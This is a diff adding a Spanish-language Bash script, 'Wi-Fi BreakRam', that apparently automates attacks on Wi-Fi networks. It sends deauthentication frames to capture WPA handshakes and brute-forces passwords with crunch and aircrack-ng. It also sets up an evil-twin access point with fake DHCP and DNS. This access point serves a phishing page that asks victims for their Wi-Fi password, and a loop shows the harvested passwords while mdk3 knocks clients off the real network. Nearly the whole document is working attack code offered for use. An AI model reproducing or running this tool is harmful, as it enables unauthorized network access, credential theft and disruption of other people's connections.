@@ -1,0 +1,295 @@
+#!/bin/bash
+
+########## Wi-Fi BreakRam by @tinchoram ##########
+
+##################################### < CONFIGURACION DEL SCRIPT > #####################################
+
+wlan0=wlp3s0
+wlan0mon=wlp3s0mon
+
+##################################### < END CONFIGURACION DEL SCRIPT > #####################################
+
+#Colores
+blanco="\033[1;37m"
+gris="\033[0;37m"
+magenta="\033[0;35m"
+rojo="\033[1;31m"
+verde="\033[1;32m"
+amarillo="\033[1;33m"
+azul="\033[1;34m"
+rescolor="\e[0m"
+
+
+##################################### < FUNCTIONS > #####################################
+
+# Muestra el mensaje principal del script
+function showheader(){
+	
+	#conditional_clear
+	echo -e "$verde#########################################################"
+	echo -e "$verde#                                                       #"
+	echo -e "$verde#	$blanco	Wi-Fi BreakRam v1.0" "$verde                    #"
+	echo -e "$verde#    		   ${blanco}by ${azul}@tinchoram" "$verde                       #"
+	echo -e "$verde#                                                       #"
+	echo -e "$verde#########################################################""$rescolor"
+	echo
+	echo
+}
+
+function menu {
+	
+	
+	while true; do
+		
+		showheader
+		
+		echo "SELECCIONA OPCION"
+		echo "                                       "
+		echo -e "      "$verde"1)"$rescolor" interface list: iwconfig      "
+		echo -e "      "$verde"2)"$rescolor" Clean all process for start: airmon-ng check kill       "
+		echo -e "      "$verde"3)"$rescolor" wlan0 start: airmon-ng start wlan0       "
+		echo -e "      "$verde"4)"$rescolor" Scan start all chanel: airodump-ng wlan0mon     "
+		echo -e "      "$verde"5)"$rescolor" Scan start host for atack: airodump-ng -c chanel -w file.cap --bssid MAC wlan0mon     "
+		echo -e "      "$verde"6)"$rescolor" Send disconet to host for obtain handshake: aireplay-ng -0 5 -a MAC-ROUTER -c MAC-Client wlan0mon     "
+		echo -e "      "" "
+		echo -e "      ""ONLY IF handshake OK"
+		echo -e "      "$verde"7)"$rescolor" use crunch & aircrack-ng for obtain password: "
+		echo -e "      "$verde"8)"$rescolor" use webinterface atack: "
+		echo -e "      "$verde"0)"$rescolor" EXIT       "
+		echo "                                       "
+		echo -n "      #> "
+		read yn
+		echo ""
+		case $yn in
+			1 ) iwconfig ;;
+			2 ) airmon-ng-checkkill ;;
+			3 ) airmon-ng-start-wlan0 ;;
+			4 ) airmon-ng-start-scan ;;
+			5 ) airmon-ng-start-scan-host-atack ;;
+			6 ) aireplay-ng-send-disconet-obtain-handshake ;;
+			7 ) crunch-and-aircrack-ng-obtain-password ;;
+			8 ) webinterface ;;
+			0 ) echo "BYE";break ;;  
+			* ) echo "Opción desconocida. Elige de nuevo";;
+		  esac
+	done
+}
+
+function airmon-ng-checkkill {
+	airmon-ng check kill
+	echo "done kill"
+}
+
+function airmon-ng-start-wlan0 {
+	airmon-ng start $wlan0
+	echo "done start"
+}
+
+function airmon-ng-start-scan {
+
+	echo "starting scan all chanel"
+	airodump-ng $wlan0mon
+	#xterm -bg white -fg black -title "Scan all channel" -e airodump-ng $wlan0mon &
+}
+
+function airmon-ng-start-scan-host-atack {
+
+	echo -e "Into chanel for scan: "
+	read varchanel
+	echo "chanel:" $varchanel
+	echo " "
+
+	echo -e "Into MAC of bssid for scan: "
+	read varbssid
+	echo "MAC of bssid:" $varbssid
+
+	echo "clean directory for capture"
+	rm -fr ./capture/*
+	echo "starting scan on chanel"
+	airodump-ng -c $varchanel -w ./capture/capture --bssid $varbssid $wlan0mon	
+	
+}
+
+function aireplay-ng-send-disconet-obtain-handshake {
+
+	echo -e "Into MAC-ROUTER: "
+	read varmacrouter
+	echo "MAC-ROUTER:" $varmacrouter
+	echo " "
+
+	echo -e "Into MAC-CLIENT: "
+	read varmacclient
+	echo "MAC-CLIENT:" $varmacclient
+	echo " "	
+
+	echo "sending disconect to client"
+	aireplay-ng -0 5 -a $varmacrouter -c $varmacclient $wlan0mon
+
+}
+
+function crunch-and-aircrack-ng-obtain-password {
+	#crunch 8 8 palabra | aircrack-ng -w - capture-01.cap -e nameRED
+
+	echo -e "Into min-character: "
+	read min
+	echo "min-character:" $min
+	echo " "
+
+	echo -e "Into max-character: "
+	read max
+	echo "min-character:" $max
+	echo " "
+
+	echo -e "Into format: ej: %%%%%%%% "
+	read format
+	echo "format:" $format
+	echo " "	
+
+	echo -e "Into range: ej: 1234567890 "
+	read range
+	echo "range:" $range
+	echo " "
+
+	echo -e "Into ESSID (wi-fi name):"
+	read ESSID
+	echo "ESSID:" $ESSID
+	echo " "	
+
+	echo "start hack"
+	crunch $min $max -t $format $range | aircrack-ng -w - ./capture/capture-01.cap -e "$ESSID"
+
+}
+
+function pre-conf {
+
+	echo -e "Into ESSID (wi-fi name):"
+	read ESSID
+	echo "ESSID:" $ESSID
+	echo " "
+
+	echo -e "Into chanel for scan: "
+	read varchanel
+	echo "chanel:" $varchanel
+	echo " "
+
+	echo -e "Into MAC-ROUTER: "
+	read varmacrouter
+	echo "MAC-ROUTER:" $varmacrouter
+	echo " "	
+
+	echo "interface=$wlan0mon
+driver=nl80211
+ssid=$ESSID
+channel=$varchanel
+">./conf/hostapd.conf
+
+	echo "$(strings ./capture/capture-01.csv | cut -d "," -f1,14 | grep -h "$ESSID" | cut -d "," -f1)" >./web/infohack/mdk3.txt
+
+	echo "<!DOCTYPE html>
+<html>
+<head>
+	<title>Login</title>
+	<link rel=\"stylesheet\" type=\"text/css\" href=\"main.css\">
+</head>
+<body>
+
+	<div class=\"login\">
+    <h1><img src=\"img/trilogo.png\"/></h1>
+    <div align=\"center\">ESSID: <b>$ESSID</b></div>
+	<div align=\"center\">BSSID: <b>$varmacrouter</b></div>
+	<div align=\"center\">CHANNEL: <b>$varchanel</b></div>
+	<br>
+    <form method=\"post\" action=\"login.php\">
+        <div align=\"center\"><h5>Por razones de seguridad, introduzca la contrase&ntilde;a para acceder a Internet</h5></div>
+        <input type=\"password\" name=\"p\" placeholder=\"Password\" required=\"required\" />
+        <button type=\"submit\" class=\"btn btn-primary btn-block btn-large\">Acceder</button>
+    </form>
+</div>
+
+</body>
+</html>
+">./web/index.htm
+
+echo "<!DOCTYPE html>
+<html>
+<head>
+	<title>Login</title>
+	<link rel=\"stylesheet\" type=\"text/css\" href=\"main.css\">
+</head>
+<body>
+
+	<div class=\"login\">
+    <h1><img src=\"img/trilogo.png\"/></h1>
+    <div align=\"center\">ESSID: <b>$ESSID</b></div>
+	<div align=\"center\">BSSID: <b>$varmacrouter</b></div>
+	<div align=\"center\">CHANNEL: <b>$varchanel</b></div>
+	<div align=\"center\"><b><font color=\"red\" size=\"3\">Error</font>:</b> La contrase&ntilde;a introducida <b>NO</b> es correcta!</b></div>
+	<br>
+    <form method=\"post\" action=\"login.php\">
+        <div align=\"center\"><h5>Por razones de seguridad, introduzca la contrase&ntilde;a para acceder a Internet</h5></div>
+        <input type=\"password\" name=\"p\" placeholder=\"Password\" required=\"required\" />
+        <button type=\"submit\" class=\"btn btn-primary btn-block btn-large\">Acceder</button>
+    </form>
+</div>
+
+</body>
+</html>
+">./web/error.html
+
+echo "while true; do
+		echo \"Reading pass:\"
+		date
+		cat ./web/infohack/pass.txt
+		cat ./web/infohack/check.txt
+		cat ./web/infohack/status.txt
+		echo \"\n\"
+		sleep 5
+	done
+">./web/infohack/readpass
+chmod +x ./web/infohack/readpass
+
+
+}
+
+
+function webinterface {
+	echo "Iniciando AP-FAKE"
+		
+	pre-conf
+
+	#start ap-fake
+	xterm -bg "#000000" -fg "#FFFFFF" -title "AP-FAKE" -e hostapd ./conf/hostapd.conf &
+
+	sleep 3
+
+	#start dhcp-server
+	xterm -bg black -fg green -title "DHCP-Server" -e dhcpd -d -f -cf ./conf/dhcpd.conf $wlan0mon	&
+
+	#start web-server
+	killall lighttpd
+	lighttpd -f ./conf/lighttpd.conf
+
+
+	sleep 2
+
+	#fake-DNS
+	systemctl stop systemd-resolved.service
+	xterm -bg white -fg blue -title "FAKEDNS" -e python ./conf/fakedns.py &
+
+
+	#read password
+	xterm -bg white -fg red -title "Read password" -e ./web/infohack/readpass &	
+
+	#Deauthentication all host
+	xterm -bg black -fg red -title "Deauthentication all host" -e mdk3 $wlan0mon d -b ./web/infohack/mdk3.txt -c $varchanel &	
+}
+
+
+
+
+##################################### < START SCRIPT > #####################################
+
+menu
+
+
+
